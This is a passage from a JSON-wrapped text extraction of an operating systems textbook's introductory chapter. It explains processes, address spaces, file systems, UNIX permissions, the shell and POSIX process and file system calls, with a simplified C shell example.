system decides to stop\r\nrunning one process and start running another, perhaps because the first one has\r\nused up more than its share of CPU time in the past second or two.\r\nWhen a process is suspended temporarily like this, it must later be restarted in\r\nexactly the same state it had when it was stopped. This means that all information\r\nabout the process must be explicitly saved somewhere during the suspension. For\r\nexample, the process may have sev eral files open for reading at once. Associated\r\nwith each of these files is a pointer giving the current position (i.e., the number of\r\nthe byte or record to be read next). When a process is temporarily suspended, all\r\nthese pointers must be saved so that a read call executed after the process is restart\u0002ed will read the proper data. In many operating systems, all the information about\r\neach process, other than the contents of its own address space, is stored in an oper\u0002ating system table called the process table, which is an array of structures, one for\r\neach process currently in existence.\r\nThus, a (suspended) process consists of its address space, usually called the\r\ncore image (in honor of the magnetic core memories used in days of yore), and its\r\nprocess table entry, which contains the contents of its registers and many other\r\nitems needed to restart the process later.\r\nThe key process-management system calls are those dealing with the creation\r\nand termination of processes. Consider a typical example. A process called the\r\ncommand interpreter or shell reads commands from a terminal. The user has just\n40 INTRODUCTION CHAP. 1\r\ntyped a command requesting that a program be compiled. The shell must now cre\u0002ate a new process that will run the compiler. When that process has finished the\r\ncompilation, it executes a system call to terminate itself.\r\nIf a process can create one or more other processes (referred to as child pro\u0002cesses) and these processes in turn can create child processes, we quickly arrive at\r\nthe process tree structure of Fig. 1-13. Related processes that are cooperating to\r\nget some job done often need to communicate with one another and synchronize\r\ntheir activities. This communication is called interprocess communication, and\r\nwill be addressed in detail in Chap. 2.\r\nA\r\nB\r\nD E F\r\nC\r\nFigure 1-13. A process tree. Process A created two child processes, B and C.\r\nProcess B created three child processes, D, E, and F.\r\nOther process system calls are available to request more memory (or release\r\nunused memory), wait for a child process to terminate, and overlay its program\r\nwith a different one.\r\nOccasionally, there is a need to convey information to a running process that is\r\nnot sitting around waiting for this information. For example, a process that is com\u0002municating with another process on a different computer does so by sending mes\u0002sages to the remote process over a computer network. To guard against the possi\u0002bility that a message or its reply is lost, the sender may request that its own operat\u0002ing system notify it after a specified number of seconds, so that it can retransmit\r\nthe message if no acknowledgement has been received yet. After setting this timer,\r\nthe program may continue doing other work.\r\nWhen the specified number of seconds has elapsed, the operating system sends\r\nan alarm signal to the process. The signal causes the process to temporarily sus\u0002pend whatever it was doing, save its registers on the stack, and start running a spe\u0002cial signal-handling procedure, for example, to retransmit a presumably lost mes\u0002sage. When the signal handler is done, the running process is restarted in the state\r\nit was in just before the signal. Signals are the software analog of hardware inter\u0002rupts and can be generated by a variety of causes in addition to timers expiring.\r\nMany traps detected by hardware, such as executing an illegal instruction or using\r\nan invalid address, are also converted into signals to the guilty process.\r\nEach person authorized to use a system is assigned a UID (User IDentifica\u0002tion) by the system administrator. Every process started has the UID of the person\r\nwho started it. A child process has the same UID as its parent. Users can be mem\u0002bers of groups, each of which has a GID (Group IDentification).\nSEC. 1.5 OPERATING SYSTEM CONCEPTS 41\r\nOne UID, called the superuser (in UNIX), or Administrator (in Windows),\r\nhas special power and may override many of the protection rules. In large in\u0002stallations, only the system administrator knows the password needed to become\r\nsuperuser, but many of the ordinary users (especially students) devote considerable\r\neffort seeking flaws in the system that allow them to become superuser without the\r\npassword.\r\nWe will study processes and interprocess communication in Chap. 2."
          },
          "1.5.2 Address Spaces": {
            "page": 72,
            "content": "1.5.2 Address Spaces\r\nEvery computer has some main memory that it uses to hold executing pro\u0002grams. In a very simple operating system, only one program at a time is in memo\u0002ry. To run a second program, the first one has to be removed and the second one\r\nplaced in memory.\r\nMore sophisticated operating systems allow multiple programs to be in memo\u0002ry at the same time. To keep them from interfering with one another (and with the\r\noperating system), some kind of protection mechanism is needed. While this mech\u0002anism has to be in the hardware, it is controlled by the operating system.\r\nThe above viewpoint is concerned with managing and protecting the com\u0002puter’s main memory. A different, but equally important, memory-related issue is\r\nmanaging the address space of the processes. Normally, each process has some set\r\nof addresses it can use, typically running from 0 up to some maximum. In the sim\u0002plest case, the maximum amount of address space a process has is less than the\r\nmain memory. In this way, a process can fill up its address space and there will be\r\nenough room in main memory to hold it all.\r\nHowever, on many computers addresses are 32 or 64 bits, giving an address\r\nspace of 232 or 264 bytes, respectively. What happens if a process has more address\r\nspace than the computer has main memory and the process wants to use it all? In\r\nthe first computers, such a process was just out of luck. Nowadays, a technique cal\u0002led virtual memory exists, as mentioned earlier, in which the operating system\r\nkeeps part of the address space in main memory and part on disk and shuttles\r\npieces back and forth between them as needed. In essence, the operating system\r\ncreates the abstraction of an address space as the set of addresses a process may\r\nreference. The address space is decoupled from the machine’s physical memory\r\nand may be either larger or smaller than the physical memory. Management of ad\u0002dress spaces and physical memory form an important part of what an operating\r\nsystem does, so all of Chap. 3 is devoted to this topic."
          },
          "1.5.3 Files": {
            "page": 72,
            "content": "1.5.3 Files\r\nAnother key concept supported by virtually all operating systems is the file\r\nsystem. As noted before, a major function of the operating system is to hide the\r\npeculiarities of the disks and other I/O devices and present the programmer with a\n42 INTRODUCTION CHAP. 1\r\nnice, clean abstract model of device-independent files. System calls are obviously\r\nneeded to create files, remove files, read files, and write files. Before a file can be\r\nread, it must be located on the disk and opened, and after being read it should be\r\nclosed, so calls are provided to do these things.\r\nTo provide a place to keep files, most PC operating systems have the concept\r\nof a directory as a way of grouping files together. A student, for example, might\r\nhave one directory for each course he is taking (for the programs needed for that\r\ncourse), another directory for his electronic mail, and still another directory for his\r\nWorld Wide Web home page. System calls are then needed to create and remove\r\ndirectories. Calls are also provided to put an existing file in a directory and to re\u0002move a file from a directory. Directory entries may be either files or other direc\u0002tories. This model also gives rise to a hierarchy—the file system—as shown in\r\nFig. 1-14.\r\nRoot directory\r\nStudents Faculty\r\nLeo Prof.Brown\r\nFiles\r\nCourses\r\nCS101 CS105\r\nPapers Grants\r\nSOSP COST-11\r\nCommittees\r\nRobbert Matty Prof.Green Prof.White\r\nFigure 1-14. A file system for a university department.\r\nThe process and file hierarchies both are organized as trees, but the similarity\r\nstops there. Process hierarchies usually are not very deep (more than three levels is\r\nunusual), whereas file hierarchies are commonly four, fiv e, or even more levels\r\ndeep. Process hierarchies are typically short-lived, generally minutes at most,\r\nwhereas the directory hierarchy may exist for years. Ownership and protection also\r\ndiffer for processes and files. Typically, only a parent process may control or even\nSEC. 1.5 OPERATING SYSTEM CONCEPTS 43\r\naccess a child process, but mechanisms nearly always exist to allow files and direc\u0002tories to be read by a wider group than just the owner.\r\nEvery file within the directory hierarchy can be specified by giving its path\r\nname from the top of the directory hierarchy, the root directory. Such absolute\r\npath names consist of the list of directories that must be traversed from the root di\u0002rectory to get to the file, with slashes separating the components. In Fig. 1-14, the\r\npath for file CS101 is /Faculty/Prof.Brown/Courses/CS101. The leading slash indi\u0002cates that the path is absolute, that is, starting at the root directory. As an aside, in\r\nWindows, the backslash (\\) character is used as the separator instead of the slash (/)\r\ncharacter (for historical reasons), so the file path given above would be written as\r\n\\Faculty\\Prof.Brown\\Courses\\CS101. Throughout this book we will generally use\r\nthe UNIX convention for paths.\r\nAt every instant, each process has a current working directory, in which path\r\nnames not beginning with a slash are looked for. For example, in Fig. 1-14, if\r\n/Faculty/Prof.Brown were the working directory, use of the path Courses/CS101\r\nwould yield the same file as the absolute path name given above. Processes can\r\nchange their working directory by issuing a system call specifying the new work\u0002ing directory.\r\nBefore a file can be read or written, it must be opened, at which time the per\u0002missions are checked. If the access is permitted, the system returns a small integer\r\ncalled a file descriptor to use in subsequent operations. If the access is prohibited,\r\nan error code is returned.\r\nAnother important concept in UNIX is the mounted file system. Most desktop\r\ncomputers have one or more optical drives into which CD-ROMs, DVDs, and Blu\u0002ray discs can be inserted. They almost always have USB ports, into which USB\r\nmemory sticks (really, solid state disk drives) can be plugged, and some computers\r\nhave floppy disks or external hard disks. To provide an elegant way to deal with\r\nthese removable media UNIX allows the file system on the optical disc to be at\u0002tached to the main tree. Consider the situation of Fig. 1-15(a). Before the mount\r\ncall, the root file system, on the hard disk, and a second file system, on a CD\u0002ROM, are separate and unrelated.\r\nHowever, the file system on the CD-ROM cannot be used, because there is no\r\nway to specify path names on it. UNIX does not allow path names to be prefixed\r\nby a drive name or number; that would be precisely the kind of device dependence\r\nthat operating systems ought to eliminate. Instead, the mount system call allows\r\nthe file system on the CD-ROM to be attached to the root file system wherever the\r\nprogram wants it to be. In Fig. 1-15(b) the file system on the CD-ROM has been\r\nmounted on directory b, thus allowing access to files /b/x and /b/y. If directory b\r\nhad contained any files they would not be accessible while the CD-ROM was\r\nmounted, since /b would refer to the root directory of the CD-ROM. (Not being\r\nable to access these files is not as serious as it at first seems: file systems are nearly\r\nalways mounted on empty directories.) If a system contains multiple hard disks,\r\nthey can all be mounted into a single tree as well.\n44 INTRODUCTION CHAP. 1\r\nRoot CD-ROM\r\na b\r\nc d cd\r\nx y a b\r\nx y\r\n(a) (b)\r\nFigure 1-15. (a) Before mounting, the files on the CD-ROM are not accessible.\r\n(b) After mounting, they are part of the file hierarchy.\r\nAnother important concept in UNIX is the special file. Special files are pro\u0002vided in order to make I/O devices look like files. That way, they can be read and\r\nwritten using the same system calls as are used for reading and writing files. Two\r\nkinds of special files exist: block special files and character special files. Block\r\nspecial files are used to model devices that consist of a collection of randomly ad\u0002dressable blocks, such as disks. By opening a block special file and reading, say,\r\nblock 4, a program can directly access the fourth block on the device, without\r\nregard to the structure of the file system contained on it. Similarly, character spe\u0002cial files are used to model printers, modems, and other devices that accept or out\u0002put a character stream. By convention, the special files are kept in the /dev direc\u0002tory. For example, /dev/lp might be the printer (once called the line printer).\r\nThe last feature we will discuss in this overview relates to both processes and\r\nfiles: pipes. A pipe is a sort of pseudofile that can be used to connect two proc\u0002esses, as shown in Fig. 1-16. If processes A and B wish to talk using a pipe, they\r\nmust set it up in advance. When process A wants to send data to process B, it writes\r\non the pipe as though it were an output file. In fact, the implementation of a pipe is\r\nvery much like that of a file. Process B can read the data by reading from the pipe\r\nas though it were an input file. Thus, communication between processes in UNIX\r\nlooks very much like ordinary file reads and writes. Stronger yet, the only way a\r\nprocess can discover that the output file it is writing on is not really a file, but a\r\npipe, is by making a special system call. File systems are very important. We will\r\nhave much more to say about them in Chap. 4 and also in Chaps. 10 and 11.\r\nProcess\r\nPipe\r\nProcess\r\nA B\r\nFigure 1-16. Tw o processes connected by a pipe.\nSEC. 1.5 OPERATING SYSTEM CONCEPTS 45"
          },
          "1.5.4 Input/Output": {
            "page": 76,
            "content": "1.5.4 Input/Output\r\nAll computers have physical devices for acquiring input and producing output.\r\nAfter all, what good would a computer be if the users could not tell it what to do\r\nand could not get the results after it did the work requested? Many kinds of input\r\nand output devices exist, including keyboards, monitors, printers, and so on. It is\r\nup to the operating system to manage these devices.\r\nConsequently, every operating system has an I/O subsystem for managing its\r\nI/O devices. Some of the I/O software is device independent, that is, applies to\r\nmany or all I/O devices equally well. Other parts of it, such as device drivers, are\r\nspecific to particular I/O devices. In Chap. 5 we will have a look at I/O software."
          },
          "1.5.5 Protection": {
            "page": 76,
            "content": "1.5.5 Protection\r\nComputers contain large amounts of information that users often want to pro\u0002tect and keep confidential. This information may include email, business plans, tax\r\nreturns, and much more. It is up to the operating system to manage the system se\u0002curity so that files, for example, are accessible only to authorized users.\r\nAs a simple example, just to get an idea of how security can work, consider\r\nUNIX. Files in UNIX are protected by assigning each one a 9-bit binary protec\u0002tion code. The protection code consists of three 3-bit fields, one for the owner, one\r\nfor other members of the owner’s group (users are divided into groups by the sys\u0002tem administrator), and one for everyone else. Each field has a bit for read access,\r\na bit for write access, and a bit for execute access. These 3 bits are known as the\r\nrwx bits. For example, the protection code rwxr-x--x means that the owner can\r\nread, write, or execute the file, other group members can read or execute (but not\r\nwrite) the file, and everyone else can execute (but not read or write) the file. For a\r\ndirectory, x indicates search permission. A dash means that the corresponding per\u0002mission is absent.\r\nIn addition to file protection, there are many other security issues. Protecting\r\nthe system from unwanted intruders, both human and nonhuman (e.g., viruses) is\r\none of them. We will look at various security issues in Chap. 9."
          },
          "1.5.6 The Shell": {
            "page": 76,
            "content": "1.5.6 The Shell\r\nThe operating system is the code that carries out the system calls. Editors,\r\ncompilers, assemblers, linkers, utility programs, and command interpreters defi\u0002nitely are not part of the operating system, even though they are important and use\u0002ful. At the risk of confusing things somewhat, in this section we will look briefly\r\nat the UNIX command interpreter, the shell. Although it is not part of the operat\u0002ing system, it makes heavy use of many operating system features and thus serves\r\nas a good example of how the system calls are used. It is also the main interface\n46 INTRODUCTION CHAP. 1\r\nbetween a user sitting at his terminal and the operating system, unless the user is\r\nusing a graphical user interface. Many shells exist, including sh, csh, ksh, and bash.\r\nAll of them support the functionality described below, which derives from the orig\u0002inal shell (sh).\r\nWhen any user logs in, a shell is started up. The shell has the terminal as stan\u0002dard input and standard output. It starts out by typing the prompt, a character\r\nsuch as a dollar sign, which tells the user that the shell is waiting to accept a com\u0002mand. If the user now types\r\ndate\r\nfor example, the shell creates a child process and runs the date program as the\r\nchild. While the child process is running, the shell waits for it to terminate. When\r\nthe child finishes, the shell types the prompt again and tries to read the next input\r\nline.\r\nThe user can specify that standard output be redirected to a file, for example,\r\ndate >file\r\nSimilarly, standard input can be redirected, as in\r\nsor t <file1 >file2\r\nwhich invokes the sort program with input taken from file1 and output sent to file2.\r\nThe output of one program can be used as the input for another program by\r\nconnecting them with a pipe. Thus\r\ncat file1 file2 file3 | sort >/dev/lp\r\ninvokes the cat program to concatenate three files and send the output to sort to\r\narrange all the lines in alphabetical order. The output of sort is redirected to the file\r\n/dev/lp, typically the printer.\r\nIf a user puts an ampersand after a command, the shell does not wait for it to\r\ncomplete. Instead it just gives a prompt immediately. Consequently,\r\ncat file1 file2 file3 | sort >/dev/lp &\r\nstarts up the sort as a background job, allowing the user to continue working nor\u0002mally while the sort is going on. The shell has a number of other interesting fea\u0002tures, which we do not have space to discuss here. Most books on UNIX discuss\r\nthe shell at some length (e.g., Kernighan and Pike, 1984; Quigley, 2004; Robbins,\r\n2005).\r\nMost personal computers these days use a GUI. In fact, the GUI is just a pro\u0002gram running on top of the operating system, like a shell. In Linux systems, this\r\nfact is made obvious because the user has a choice of (at least) two GUIs: Gnome\r\nand KDE or none at all (using a terminal window on X11). In Windows, it is also\r\npossible to replace the standard GUI desktop (Windows Explorer) with a different\r\nprogram by changing some values in the registry, although few people do this.\nSEC. 1.5 OPERATING SYSTEM CONCEPTS 47"
          },
          "1.5.7 Ontogeny Recapitulates Phylogeny": {
            "page": 78,
            "content": "1.5.7 Ontogeny Recapitulates Phylogeny\r\nAfter Charles Darwin’s book On the Origin of the Species was published, the\r\nGerman zoologist Ernst Haeckel stated that ‘‘ontogeny recapitulates phylogeny.’’\r\nBy this he meant that the development of an embryo (ontogeny) repeats (i.e., reca\u0002pitulates) the evolution of the species (phylogeny). In other words, after fertiliza\u0002tion, a human egg goes through stages of being a fish, a pig, and so on before turn\u0002ing into a human baby. Modern biologists regard this as a gross simplification, but\r\nit still has a kernel of truth in it.\r\nSomething vaguely analogous has happened in the computer industry. Each\r\nnew species (mainframe, minicomputer, personal computer, handheld, embedded\r\ncomputer, smart card, etc.) seems to go through the development that its ancestors\r\ndid, both in hardware and in software. We often forget that much of what happens\r\nin the computer business and a lot of other fields is technology driven. The reason\r\nthe ancient Romans lacked cars is not that they liked walking so much. It is be\u0002cause they did not know how to build cars. Personal computers exist not because\r\nmillions of people have a centuries-old pent-up desire to own a computer, but be\u0002cause it is now possible to manufacture them cheaply. We often forget how much\r\ntechnology affects our view of systems and it is worth reflecting on this point from\r\ntime to time.\r\nIn particular, it frequently happens that a change in technology renders some\r\nidea obsolete and it quickly vanishes. However, another change in technology\r\ncould revive it again. This is especially true when the change has to do with the\r\nrelative performance of different parts of the system. For instance, when CPUs\r\nbecame much faster than memories, caches became important to speed up the\r\n‘‘slow’’ memory. If new memory technology someday makes memories much\r\nfaster than CPUs, caches will vanish. And if a new CPU technology makes them\r\nfaster than memories again, caches will reappear. In biology, extinction is forever,\r\nbut in computer science, it is sometimes only for a few years.\r\nAs a consequence of this impermanence, in this book we will from time to\r\ntime look at ‘‘obsolete’’ concepts, that is, ideas that are not optimal with current\r\ntechnology. Howev er, changes in the technology may bring back some of the\r\nso-called ‘‘obsolete concepts.’’ For this reason, it is important to understand why a\r\nconcept is obsolete and what changes in the environment might bring it back again.\r\nTo make this point clearer, let us consider a simple example. Early computers\r\nhad hardwired instruction sets. The instructions were executed directly by hard\u0002ware and could not be changed. Then came microprogramming (first introduced on\r\na large scale with the IBM 360), in which an underlying interpreter carried out the\r\n‘‘hardware instructions’’ in software. Hardwired execution became obsolete. It\r\nwas not flexible enough. Then RISC computers were invented, and micropro\u0002gramming (i.e., interpreted execution) became obsolete because direct execution\r\nwas faster. Now we are seeing the resurgence of interpretation in the form of Java\r\napplets that are sent over the Internet and interpreted upon arrival. Execution speed\n48 INTRODUCTION CHAP. 1\r\nis not always crucial because network delays are so great that they tend to domi\u0002nate. Thus the pendulum has already swung several cycles between direct execu\u0002tion and interpretation and may yet swing again in the future.\r\nLarge Memories\r\nLet us now examine some historical developments in hardware and how they\r\nhave affected software repeatedly. The first mainframes had limited memory. A\r\nfully loaded IBM 7090 or 7094, which played king of the mountain from late 1959\r\nuntil 1964, had just over 128 KB of memory. It was mostly programmed in assem\u0002bly language and its operating system was written in assembly language to save\r\nprecious memory.\r\nAs time went on, compilers for languages like FORTRAN and COBOL got\r\ngood enough that assembly language was pronounced dead. But when the first\r\ncommercial minicomputer (the PDP-1) was released, it had only 4096 18-bit words\r\nof memory, and assembly language made a surprise comeback. Eventually, mini\u0002computers acquired more memory and high-level languages became prevalent on\r\nthem.\r\nWhen microcomputers hit in the early 1980s, the first ones had 4-KB memo\u0002ries and assembly-language programming rose from the dead. Embedded com\u0002puters often used the same CPU chips as the microcomputers (8080s, Z80s, and\r\nlater 8086s) and were also programmed in assembler initially. Now their descen\u0002dants, the personal computers, have lots of memory and are programmed in C,\r\nC++, Java, and other high-level languages. Smart cards are undergoing a similar\r\ndevelopment, although beyond a certain size, the smart cards often have a Java\r\ninterpreter and execute Java programs interpretively, rather than having Java being\r\ncompiled to the smart card’s machine language.\r\nProtection Hardware\r\nEarly mainframes, like the IBM 7090/7094, had no protection hardware, so\r\nthey just ran one program at a time. A buggy program could wipe out the operat\u0002ing system and easily crash the machine. With the introduction of the IBM 360, a\r\nprimitive form of hardware protection became available. These machines could\r\nthen hold several programs in memory at the same time and let them take turns\r\nrunning (multiprogramming). Monoprogramming was declared obsolete.\r\nAt least until the first minicomputer showed up—without protection hard\u0002ware—so multiprogramming was not possible. Although the PDP-1 and PDP-8\r\nhad no protection hardware, eventually the PDP-11 did, and this feature led to mul\u0002tiprogramming and eventually to UNIX.\r\nWhen the first microcomputers were built, they used the Intel 8080 CPU chip,\r\nwhich had no hardware protection, so we were back to monoprogramming—one\r\nprogram in memory at a time. It was not until the Intel 80286 chip that protection\nSEC. 1.5 OPERATING SYSTEM CONCEPTS 49\r\nhardware was added and multiprogramming became possible. Until this day, many\r\nembedded systems have no protection hardware and run just a single program.\r\nNow let us look at operating systems. The first mainframes initially had no\r\nprotection hardware and no support for multiprogramming, so they ran simple op\u0002erating systems that handled one manually loaded program at a time. Later they ac\u0002quired the hardware and operating system support to handle multiple programs at\r\nonce, and then full timesharing capabilities.\r\nWhen minicomputers first appeared, they also had no protection hardware and\r\nran one manually loaded program at a time, even though multiprogramming was\r\nwell established in the mainframe world by then. Gradually, they acquired protec\u0002tion hardware and the ability to run two or more programs at once. The first\r\nmicrocomputers were also capable of running only one program at a time, but later\r\nacquired the ability to multiprogram. Handheld computers and smart cards went\r\nthe same route.\r\nIn all cases, the software development was dictated by technology. The first\r\nmicrocomputers, for example, had something like 4 KB of memory and no protec\u0002tion hardware. High-level languages and multiprogramming were simply too much\r\nfor such a tiny system to handle. As the microcomputers evolved into modern per\u0002sonal computers, they acquired the necessary hardware and then the necessary soft\u0002ware to handle more advanced features. It is likely that this development will con\u0002tinue for years to come. Other fields may also have this wheel of reincarnation, but\r\nin the computer industry it seems to spin faster.\r\nDisks\r\nEarly mainframes were largely magnetic-tape based. They would read in a pro\u0002gram from tape, compile it, run it, and write the results back to another tape. There\r\nwere no disks and no concept of a file system. That began to change when IBM\r\nintroduced the first hard disk—the RAMAC (RAndoM ACcess) in 1956. It occu\u0002pied about 4 square meters of floor space and could store 5 million 7-bit charac\u0002ters, enough for one medium-resolution digital photo. But with an annual rental fee\r\nof $35,000, assembling enough of them to store the equivalent of a roll of film got\r\npricey quite fast. But eventually prices came down and primitive file systems were\r\ndeveloped.\r\nTypical of these new dev elopments was the CDC 6600, introduced in 1964 and\r\nfor years by far the fastest computer in the world. Users could create so-called\r\n‘‘permanent files’’ by giving them names and hoping that no other user had also\r\ndecided that, say, ‘‘data’’ was a suitable name for a file. This was a single-level di\u0002rectory. Eventually, mainframes developed complex hierarchical file systems, per\u0002haps culminating in the MULTICS file system.\r\nAs minicomputers came into use, they eventually also had hard disks. The\r\nstandard disk on the PDP-11 when it was introduced in 1970 was the RK05 disk,\r\nwith a capacity of 2.5 MB, about half of the IBM RAMAC, but it was only about\n50 INTRODUCTION CHAP. 1\r\n40 cm in diameter and 5 cm high. But it, too, had a single-level directory initially.\r\nWhen microcomputers came out, CP/M was initially the dominant operating sys\u0002tem, and it, too, supported just one directory on the (floppy) disk.\r\nVirtual Memory\r\nVirtual memory (discussed in Chap. 3) gives the ability to run programs larger\r\nthan the machine’s physical memory by rapidly moving pieces back and forth be\u0002tween RAM and disk. It underwent a similar development, first appearing on\r\nmainframes, then moving to the minis and the micros. Virtual memory also allow\u0002ed having a program dynamically link in a library at run time instead of having it\r\ncompiled in. MULTICS was the first system to allow this. Eventually, the idea\r\npropagated down the line and is now widely used on most UNIX and Windows\r\nsystems.\r\nIn all these developments, we see ideas invented in one context and later\r\nthrown out when the context changes (assembly-language programming, monopro\u0002gramming, single-level directories, etc.) only to reappear in a different context\r\noften a decade later. For this reason in this book we will sometimes look at ideas\r\nand algorithms that may seem dated on today’s gigabyte PCs, but which may soon\r\ncome back on embedded computers and smart cards."
          }
        }
      },
      "1.6 SYSTEM CALLS": {
        "page": 81,
        "children": {
          "1.6.1 System Calls for Process Management": {
            "page": 84,
            "content": "1.6.1 System Calls for Process Management\r\nThe first group of calls in Fig. 1-18 deals with process management. Fork is a\r\ngood place to start the discussion. Fork is the only way to create a new process in\r\nPOSIX. It creates an exact duplicate of the original process, including all the file\r\ndescriptors, registers—everything. After the fork, the original process and the copy\r\n(the parent and child) go their separate ways. All the variables have identical val\u0002ues at the time of the fork, but since the parent’s data are copied to create the child,\r\nsubsequent changes in one of them do not affect the other one. (The program text,\r\nwhich is unchangeable, is shared between parent and child.) The fork call returns a\r\nvalue, which is zero in the child and equal to the child’s PID (Process IDentifier)\r\nin the parent. Using the returned PID, the two processes can see which one is the\r\nparent process and which one is the child process.\n54 INTRODUCTION CHAP. 1\r\nProcess management\r\nCall Description\r\npid = for k( ) Create a child process identical to the parent\r\npid = waitpid(pid, &statloc, options) Wait for a child to terminate\r\ns = execve(name, argv, environp) Replace a process’ core image\r\nexit(status) Ter minate process execution and return status\r\nFile management\r\nCall Description\r\nfd = open(file, how, ...) Open a file for reading, writing, or both\r\ns = close(fd) Close an open file\r\nn = read(fd, buffer, nbytes) Read data from a file into a buffer\r\nn = write(fd, buffer, nbytes) Write data from a buffer into a file\r\nposition = lseek(fd, offset, whence) Move the file pointer\r\ns = stat(name, &buf) Get a file’s status infor mation\r\nDirector y- and file-system management\r\nCall Description\r\ns = mkdir(name, mode) Create a new director y\r\ns = rmdir(name) Remove an empty directory\r\ns = link(name1, name2) Create a new entr y, name2, pointing to name1\r\ns = unlink(name) Remove a director y entr y\r\ns = mount(special, name, flag) Mount a file system\r\ns = umount(special) Unmount a file system\r\nMiscellaneous\r\nCall Description\r\ns = chdir(dir name) Change the wor king director y\r\ns = chmod(name, mode) Change a file’s protection bits\r\ns = kill(pid, signal) Send a signal to a process\r\nseconds = time(&seconds) Get the elapsed time since Jan. 1, 1970\r\nFigure 1-18. Some of the major POSIX system calls. The return code s is −1 if\r\nan error has occurred. The return codes are as follows: pid is a process id, fd is a\r\nfile descriptor, n is a byte count, position is an offset within the file, and seconds\r\nis the elapsed time. The parameters are explained in the text.\r\nIn most cases, after a fork, the child will need to execute different code from\r\nthe parent. Consider the case of the shell. It reads a command from the terminal,\r\nforks off a child process, waits for the child to execute the command, and then\r\nreads the next command when the child terminates. To wait for the child to finish,\nSEC. 1.6 SYSTEM CALLS 55\r\nthe parent executes a waitpid system call, which just waits until the child terminates\r\n(any child if more than one exists). Waitpid can wait for a specific child, or for any\r\nold child by setting the first parameter to −1. When waitpid completes, the address\r\npointed to by the second parameter, statloc, will be set to the child process’ exit\r\nstatus (normal or abnormal termination and exit value). Various options are also\r\nprovided, specified by the third parameter. For example, returning immediately if\r\nno child has already exited.\r\nNow consider how fork is used by the shell. When a command is typed, the\r\nshell forks off a new process. This child process must execute the user command.\r\nIt does this by using the execve system call, which causes its entire core image to\r\nbe replaced by the file named in its first parameter. (Actually, the system call itself\r\nis exec, but several library procedures call it with different parameters and slightly\r\ndifferent names. We will treat these as system calls here.) A highly simplified shell\r\nillustrating the use of fork, waitpid, and execve is shown in Fig. 1-19.\r\n#define TRUE 1\r\nwhile (TRUE) { /* repeat forever */\r\ntype prompt( ); /* display prompt on the screen */\r\nread command(command, parameters); /* read input from terminal */\r\nif (for k( ) != 0) { /* fork off child process */\r\n/\r\n* Parent code. */\r\nwaitpid(−1, &status, 0); /* wait for child to exit */\r\n} else {\r\n/\r\n* Child code. */\r\nexecve(command, parameters, 0); /* execute command */\r\n}\r\n}\r\nFigure 1-19. A stripped-down shell. Throughout this book, TRUE is assumed to\r\nbe defined as 1.\r\nIn the most general case, execve has three parameters: the name of the file to\r\nbe executed, a pointer to the argument array, and a pointer to the environment\r\narray. These will be described shortly. Various library routines, including execl,\r\nexecv, execle, and execve, are provided to allow the parameters to be omitted or\r\nspecified in various ways. Throughout this book we will use the name exec to\r\nrepresent the system call invoked by all of these.\r\nLet us consider the case of a command such as\r\ncp file1 file2\r\nused to copy file1 to file2. After the shell has forked, the child process locates and\r\nexecutes the file cp and passes to it the names of the source and target files.\n56 INTRODUCTION CHAP. 1\r\nThe main program of cp (and main program of most other C programs) con\u0002tains the declaration\r\nmain(argc, argv, envp)\r\nwhere argc is a count of the number of items on the command line, including the\r\nprogram name. For the example above, argc is 3.\r\nThe second parameter, argv, is a pointer to an array. Element i of that array is a\r\npointer to the ith string on the command line. In our example, argv[0] would point\r\nto the string ‘‘cp’’, argv[1] would point to the string ‘‘file1’’, and argv[2] would\r\npoint to the string ‘‘file2’’.\r\nThe third parameter of main, envp, is a pointer to the environment, an array of\r\nstrings containing assignments of the form name = value used to pass information\r\nsuch as the terminal type and home directory name to programs. There are library\r\nprocedures that programs can call to get the environment variables, which are often\r\nused to customize how a user wants to perform certain tasks (e.g., the default print\u0002er to use). In Fig. 1-19, no environment is passed to the child, so the third parame\u0002ter of execve is a zero.\r\nIf exec seems complicated, do not despair; it is (semantically) the most com\u0002plex of all the POSIX system calls. All the other ones are much simpler. As an ex\u0002ample of a simple one, consider exit, which processes should use when they are\r\nfinished executing. It has one parameter, the exit status (0 to 255), which is re\u0002turned to the parent via statloc in the waitpid system call.\r\nProcesses in UNIX have their memory divided up into three segments: the text\r\nsegment (i.e., the program code), the data segment (i.e., the variables), and the\r\nstack segment. The data segment grows upward and the stack grows downward,\r\nas shown in Fig. 1-20. Between them is a gap of unused address space. The stack\r\ngrows into the gap automatically, as needed, but expansion of the data segment is\r\ndone explicitly by using a system call, br k, which specifies the new address where\r\nthe data segment is to end. This call, however, is not defined by the POSIX stan\u0002dard, since programmers are encouraged to use the malloc library procedure for\r\ndynamically allocating storage, and the underlying implementation of malloc was\r\nnot thought to be a suitable subject for standardization since few programmers use\r\nit directly and it is doubtful that anyone even notices that br k is not in POSIX."
          },
          "1.6.2 System Calls for File Management": {
            "page": 87,
            "content": "1.6.2 System Calls for File Management\r\nMany system calls relate to the file system. In this section we will look at calls\r\nthat operate on individual files; in the next one we will examine those that involve\r\ndirectories or the file system as a whole.\r\nTo read or write a file, it must first be opened. This call specifies the file name\r\nto be opened, either as an absolute path name or relative to the working directory,\r\nas well as a code of O RDONLY, O WRONLY, or O RDWR, meaning open for\r\nreading, writing, or both. To create a new file, the O CREAT parameter is used.\nSEC. 1.6 SYSTEM CALLS 57\r\n\r\nAddress (hex)\r\nFFFF\r\n0000\r\nStack\r\nData\r\nText\r\nGap\r\nFigure 1-20. Processes have three segments: text, data, and stack.\r\nThe file descriptor returned can then be used for reading or writing. Afterward, the\r\nfile can be closed by close, which makes the file descriptor available for reuse on a\r\nsubsequent open.\r\nThe most heavily used calls are undoubtedly read and wr ite. We saw read ear\u0002lier. Wr ite has the same parameters.\r\nAlthough most programs read and write files sequentially, for some applica\u0002tions programs need to be able to access any part of a file at random. Associated\r\nwith each file is a pointer that indicates the current position in the file. When read\u0002ing (writing) sequentially, it normally points to the next byte to be read (written).\r\nThe lseek call changes the value of the position pointer, so that subsequent calls to\r\nread or wr ite can begin anywhere in the file.\r\nLseek has three parameters: the first is the file descriptor for the file, the sec\u0002ond is a file position, and the third tells whether the file position is relative to the\r\nbeginning of the file, the current position, or the end of the file. The value returned\r\nby lseek is the absolute position in the file (in bytes) after changing the pointer.\r\nFor each file, UNIX keeps track of the file mode (regular file, special file, di\u0002rectory, and so on), size, time of last modification, and other information. Pro\u0002grams can ask to see this information via the stat system call. The first parameter\r\nspecifies the file to be inspected; the second one is a pointer to a structure where\r\nthe information is to be put. The fstat calls does the same thing for an open file."
          },
          "1.6.3 System Calls for Directory Management": {
            "page": 88,
